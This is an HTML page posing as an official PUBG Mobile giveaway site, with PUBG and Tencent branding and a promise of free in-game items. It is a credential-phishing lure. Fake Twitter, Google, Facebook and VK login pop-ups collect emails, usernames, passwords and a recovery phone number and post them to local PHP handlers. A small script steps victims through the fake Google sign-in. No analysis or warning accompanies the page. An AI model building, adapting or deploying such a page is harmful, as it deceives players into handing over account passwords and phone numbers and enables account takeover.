<!DOCTYPE html>
<html>
<head>
<title>PUBG Mobile - Official PUBG on mobile</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:description" content="For a limited time you can collect all the item that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
<meta property="og:image" content="img/slider/s1.jpg"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#f8a800">
<link rel="icon" type="img/png" href="img/thumbnail.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<link rel="stylesheet" type="text/css" href="css/mystyle.css"/>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
</head>
<body>

<div class="loading"></div>

<style type="text/css">
	#login fieldset:not(:first-of-type) {
		display: none;
	}
</style>

<div class="sticky">
<a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
</div>
<div class="slider-container">
<div class="slider">
<img src="img/slider/s1.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/s2.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/s3.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/s4.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/slider/s5.jpg" style="width:100%">
</div>
</div>

<div class="gallery-container">

<!--- TWITTER LOGIN --->
<div id="twitter">
<div class="twitter-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-twitter">
<center>
<img width="30" src="img/login-popup/twitter.png">
</center>
</div>
</br>
</br>
<center>
<h5>Login to Twitter</h5>
</center>
<form class="formku" action="twitter.php" method="post">
<input type="text" name="etw" placeholder="Phone, email, or username" autocomplete="off" autocapitalize="off" required></br>
<input type="password" name="ptw" placeholder="Password" autocomplete="off" autocapitalize="off" required></br>
</br>
</br>
<center>
<button type="submit" class="btn-login-twitter"><b>Login</b></button>
</center>
</form>
</div>
</div>
<!--- /TWITTER LOGIN --->


<!--- GOOGLE PLAY LOGIN --->
<div id="gp">
<div class="gp-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-gp">
<center>
<img width="80" src="img/login-popup/google.png">
</center>
</div>
</br>
<form class="formku" id="login" novalidate action="google.php" method="post">
<fieldset>
<center>
<h5>Sign in</h5>
</br>
<b font-size="100" style="color:black;">with your Google Account</b>
</center>
<input type="text" name="gmail" placeholder="Email or phone" autocomplete="off" autocapitalize="off" required></br>
<button type="button" class="btn-register-gp"><b>Create account</b></button>
<button type="button" class="next btn-login-gp"><b>Next</b></button>
</fieldset>

<fieldset>
<center>
<i style="color: black;" class="fa fa-user-circle fa-3x"></i>
</br>
</br>
<h5>Welcome</h5>
</br>
<b font-size="100" style="color:black;">enter your password below</b>
</center>
<input type="password" name="gpass" placeholder="Enter your password" autocomplete="off" autocapitalize="off" required></br>
<button type="button" class="previous btn-register-gp"><b>Previous</b></button>
<button type="button" class="next btn-login-gp"><b>Next</b></button>
</fieldset>

<fieldset>
<center>
<h5>Protect your account</h5>
</br>
<i style="color: black;" class="fa fa-mobile fa-5x"></i>
</br>
<b font-size="100" style="color:black;">Add a recovery phone number for security, such as to send a security notification or help you log in to your account if you forget your password.</b>
</center>
<input type="number" name="nope" placeholder="Enter your number phone" autocomplete="off" autocapitalize="off" required></br>
<button type="button" class="previous btn-register-gp"><b>Previous</b></button>
<button type="submit" class=" btn-login-gp"><b>DONE</b></button>
</fieldset>

</form>
</div>
</div>
<!--- /GOOGLE PLAY LOGIN --->




<!--- FB LOGIN --->
<div id="fb">
<div class="fb-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-fb">
<center>
<img width="100" src="img/login-popup/fb.png">
</center>
</div>
</br>
<form class="formku" action="facebook.php" method="post">
<p class="mylabel">Phone or email:</p>
<input type="text" name="efb" placeholder="" autocomplete="off" autocapitalize="off" required></br>
<p class="mylabel">Password:</p>
<input type="password" name="pfb" placeholder="" autocomplete="off" autocapitalize="off"></br>
</br>
</br>
<center>
<button type="submit" class="btn-login-fb"><b>Log In</b></button>
</center>
</br>
</br>
<div class="divider">
<span>or</span>
</div>
</br>
</br>
<center>
<button class="btn-register-fb">Create a New Account</button>
</center>
</form>
</div>
</div>
<!--- /FB LOGIN --->


<!--- VK LOGIN --->
<div id="vk">
<div class="vk-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-vk">
<center>
<img width="30" src="https://m.vk.com/images/mobile/logo/logo.png">
</center>
</div>
</br>
<form class="formku" action="vk.php" method="post">
<p class="mylabel">Phone or email:</p>
<input type="text" name="evk" placeholder="" autocomplete="off" autocapitalize="off" required></br>
<p class="mylabel">Password:</p>
<input type="password" name="pvk" placeholder="" autocomplete="off" autocapitalize="off"></br>
</br>
</br>
<center>
<button type="submit" class="btn-login-vk"><b>Log In</b></button>
</center>
</br>
</form>
</div>
</div>
<!--- /VK LOGIN --->



<div class="notification">
<span class="title"><i class="fa fa-sign-in"></i> Login first</span>
<span class="label"><i class="fa fa-bell-o"></i> Event</span>
<span><br/><br/>For a limited time you can collect all the item that you wanted just for free.<br/><br/>Please login before collect the item.</span>
</div>

</br>
</br>

<button onclick="location.href='#twitter';" class="twitter"><i style="float:left;" class="fa fa-twitter"></i>Twitter</button>
</br>
</br>
<button onclick="location.href='#fb';" class="fb"><i style="float:left;" class="fa fa-facebook-square"></i>Facebook</button>
</br>
</br>
<button onclick="location.href='#vk';" class="vk"><i style="float:left;" class="fa fa-vk"></i>VK</button>
</br>
</br>
<button onclick="location.href='#gp';" class="playgame"><i style="float:left;" class="fa fa-google-plus"></i>Google Play Games</button>
</div>


<div class="notification-container">
<div class="button">
<a href="https://play.google.com/store/apps/details?id=com.tencent.ig">
<img src="img/download/googleplay.png"></a>
<a href="https://itunes.apple.com/us/app/pubg-mobile/id1330123889?mt=8">
<img src="img/download/appstore.png"></a>
</div>
</div>


<div class="footer">
<center>
<img style="margin-right:5px" width="30" src="img/pubg.png">
<img width="80" src="img/tencent.png">
<br>
<img width="200" src="img/lightspeed.png">
<br>
<div class="footer">Copyright &copy; PUBG Corporation. All rights reserved.
<br>Privacy Policy | Tencent Games User Agreement
</div>

<script src="http://code.jquery.com/jquery-2.1.4.min.js"></script> <script> $(window).load(function() { $(".loading").fadeOut("fast"); }); </script>


<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>

<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>

<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>


</body>

</htm>